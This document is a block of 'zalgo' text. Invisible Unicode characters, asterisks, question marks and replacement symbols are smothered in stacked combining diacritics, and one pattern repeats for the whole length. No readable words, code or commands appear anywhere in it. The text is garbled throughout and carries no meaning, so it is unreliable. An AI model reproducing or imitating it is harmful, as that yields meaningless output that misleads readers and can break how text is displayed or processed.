̞⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̽͌̎̅̌̚͘̚